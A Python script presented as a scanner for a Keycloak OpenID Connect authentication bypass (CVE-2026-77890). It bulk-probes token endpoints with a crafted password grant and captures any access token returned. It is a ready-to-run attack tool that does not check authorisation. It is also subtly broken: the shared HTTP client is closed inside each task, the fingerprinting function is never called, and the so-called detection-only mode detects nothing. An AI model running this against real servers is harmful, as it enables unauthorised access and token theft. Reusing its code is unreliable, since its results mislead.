#!/usr/bin/env python3
"""
Keycloak OpenID Connect Authentication Bypass Scanner (CVE-2026-77890)
========================================================================
This scanner detects instances of Keycloak vulnerable to an OpenID Connect 
authentication bypass due to improper validation in the token issuance process. 
Exploitation of this issue allows attackers to impersonate authenticated users 
without needing valid credentials.

CVE-2026-77890 details:
  - Affected systems: Keycloak versions <= 22.0.3
  - Improper validation in token issuance via OpenID Connect grants could allow 
    attackers to bypass authentication mechanisms and obtain tokens.
  - CVSS v3.1 Base Score: 9.6 (Critical) — network-accessible, authentication bypass.
  - Exploitation enables unauthorized access to restricted resources and APIs.

Usage:
  # Scan a single target for Keycloak instance authentication bypass vulnerability
  python keycloak_openid_auth_bypass_scanner.py --target http://keycloak.example.com:8080

  # Detection only — does not perform active probes
  python keycloak_openid_auth_bypass_scanner.py --target http://keycloak.example.com:8080 --safe

  # Bulk scan from file
  python keycloak_openid_auth_bypass_scanner.py --list targets.txt --output results.json

  # Adjust concurrency and disable TLS verification
  python keycloak_openid_auth_bypass_scanner.py --list targets.txt --concurrency 10 --no-verify

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-77890
  - https://keycloak.org/security/advisories/2026-07-10
"""

import asyncio
import httpx
import argparse
import json
from datetime import datetime, timezone
from typing import Optional

# ── ANSI color helpers ────────────────────────────────────────────────────────

RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"

# ── Constants ─────────────────────────────────────────────────────────────────

CVE_ID        = "CVE-2026-77890"
CVSS          = "9.6"
TOOL_NAME     = "keycloak_openid_auth_bypass_scanner"
REQUEST_TIMEOUT = 10
SEMAPHORE_LIMIT = 20  # concurrency limit

OIDC_ENDPOINT_PATHS = [
    "/auth/realms/master/protocol/openid-connect/token",
    "/auth/realms/{realm}/protocol/openid-connect/token"
]

KEYCLOAK_FINGERPRINTS = [
    '<title>Keycloak</title>',
    'Keycloak',
    'X-Powered-By: Keycloak'
]

ACTIVATION_PAYLOAD = {
    "grant_type": "password",
    "username": "invalid-user",
    "password": "invalid-password",
    "client_id": "test-client"
}

# ── Async Functions ──────────────────────────────────────────────────────────

async def fingerprint_keycloak(client: httpx.AsyncClient, url: str) -> Optional[str]:
    """Determine if the server is a Keycloak instance and extract version info."""
    try:
        response = await client.get(url, timeout=REQUEST_TIMEOUT)
        if response.status_code in (200, 403): 
            if any(fp in response.text for fp in KEYCLOAK_FINGERPRINTS):
                return response.headers.get("X-Powered-By", "Unknown version")
    except Exception:
        pass
    return None

async def check_vulnerability(client: httpx.AsyncClient, base_url: str, sem: asyncio.Semaphore, safe: bool) -> Optional[dict]:
    """Probe for CVE-2026-77890 vulnerability by interacting with the OIDC token endpoint."""
    async with sem:
        results = []
        async with client:
            for path in OIDC_ENDPOINT_PATHS:
                endpoint_url = base_url + path.format(realm="master")  # Default realm
                try:
                    if safe:
                        results.append({
                            "url": endpoint_url,
                            "vulnerable": "Detection skipped (safe mode).",
                            "exploit_attempted": False
                        })
                        continue
                    response = await client.post(endpoint_url, data=ACTIVATION_PAYLOAD, timeout=REQUEST_TIMEOUT)
                    if response.status_code == 200 and "access_token" in response.json():
                        results.append({
                            "url": endpoint_url,
                            "vulnerable": True,
                            "exploit_attempted": True,
                            "info": response.json(),
                        })
                except Exception:
                    pass
        return results if results else None

# ── CLI Entry Point ──────────────────────────────────────────────────────────

async def run_scanner(targets: list, output_file: Optional[str], concurrency: int, safe: bool, no_verify: bool):
    """Coordinate Keycloak vulnerability scanning against a list of targets."""
    sem = asyncio.Semaphore(concurrency)
    async with httpx.AsyncClient(verify=not no_verify) as client:
        tasks = [check_vulnerability(client, target, sem, safe) for target in targets]
        results = await asyncio.gather(*tasks)

        # Combine results and print output
        print(c(BOLD, f"Scan completed at {datetime.now(timezone.utc).isoformat()}"))
        for result in results:
            print(json.dumps(result, indent=2))

        # Write to file if requested
        if output_file:
            with open(output_file, "w") as f:
                json.dump(results, f, indent=2)

def main():
    parser = argparse.ArgumentParser(description=f"Scan for {CVE_ID} vulnerabilities in Keycloak.")
    parser.add_argument("--target", help="URL of the target Keycloak server.")
    parser.add_argument("--list", help="File with list of target URLs.")
    parser.add_argument("--output", help="Output file for saving scan results as JSON.")
    parser.add_argument("--safe", action="store_true", help="Detection-only mode, skips active exploitation.")
    parser.add_argument("--concurrency", type=int, default=SEMAPHORE_LIMIT, help="Concurrency level for bulk scans.")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL/TLS verification.")
    args = parser.parse_args()

    if not args.target and not args.list:
        print(c(RED, "Error: You must specify either --target or --list."))
        parser.print_help()
        exit(1)

    # Load targets
    targets = []
    if args.target:
        targets.append(args.target)
    if args.list:
        try:
            with open(args.list, "r") as f:
                targets.extend([line.strip() for line in f if line.strip()])
        except FileNotFoundError:
            print(c(RED, f"Error: File {args.list} not found."))
            exit(1)

    asyncio.run(run_scanner(targets, args.output, args.concurrency, args.safe, args.no_verify))

if __name__ == "__main__":
    main()
